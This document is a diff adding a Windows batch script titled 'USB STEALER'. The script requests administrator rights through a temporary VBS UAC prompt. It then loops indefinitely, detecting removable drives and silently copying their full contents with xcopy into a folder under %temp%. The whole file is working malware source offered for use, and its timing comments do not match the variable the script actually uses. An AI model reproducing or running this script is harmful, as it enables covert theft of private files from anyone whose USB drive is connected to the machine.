@@ -1,0 +1,83 @@
+@echo off >Nul
+setlocal EnableDelayedExpansion
+>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
+if '%errorlevel%' NEQ '0' (
+    echo Requesting Elevation.
+    goto UACPrompt
+) else ( goto gotAdmin )
+
+:UACPrompt
+    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
+    set params = %*:"=""
+    echo UAC.ShellExecute "cmd.exe", "/c %~s0 %params%", "", "runas", 1 >> "%temp%\getadmin.vbs"
+
+    "%temp%\getadmin.vbs"
+    del "%temp%\getadmin.vbs"
+    exit /B
+
+:gotAdmin
+
+Title [:: USB STEALER ::] && Color 07
+If not exist "%temp%\DriveManage" ( goto :gen
+) ELSE (
+   goto :scan_4drive
+)
+
+:gen
+Mkdir "%temp%\DriveManage"
+Set "home=%temp%\DriveManage"
+Set "scanzone=1800"
+
+:scan_4drive
+REM [Check all drives for USB(s) connected to the current system]
+wmic logicaldisk get caption,description,filesystem | Find "Removable" >%home%\drive_list.ini
+
+REM [Analyze drive list]
+Set "cmd=findstr /R /N "^^" %home%\drive_list.ini | find /C ":""
+For /f %%w in ('!cmd!') do set num=%%w
+
+REM [If Drive(s) are found, proceed, else repeat loop]
+If %num% == 0 (
+Del /F /Q "%home%\drive_list.ini"
+goto :scan_4drive
+) ELSE (
+goto :proceed
+)
+
+:proceed
+REM [Create a dump folder]
+If not exist "%temp%\DriveManage\Collected" (
+Mkdir "%temp%\DriveManage\Collected"
+)
+
+REM [Trim out unnecessary text from list]
+set "file=%home%\drive_list.ini"
+For /f "delims=" %%a in (%file%) do (
+  set "var=%%a"
+  echo !var:~0,2! >>%home%\USB.ini
+)
+Del /Q %file%
+
+REM [Optional Time Label Sub for Copying]
+:: set "hour=%time%"
+:: set "minute=%time%"
+:: set "label=%hour:~0,2%-%minute:~3,2%"
+
+REM [Parse text data into command string]
+REM [Attempt to rip all USB files]
+Set "target=%home%\USB.ini"
+for /f "delims=" %%q in (%target%) do (
+Set "name=%%q"
+Mkdir "%home%\Collected\USB [!name:~0,1!]"
+xcopy /Y /E /R /C %%q "%home%\Collected\USB [!name:~0,1!]"
+)
+
+REM [Removes scan logs & restarts the scan]
+Del /F /Q %home%\USB.ini
+
+REM [Wait X-amount of Minutes Before Re-Scanning]
+REM [Default: 00:05:00 (5 Minutes)]
+Set "scanone=300"
+Timeout /T %scanzone% /nobreak >Nul
+goto :scan_4drive
+@exit /B
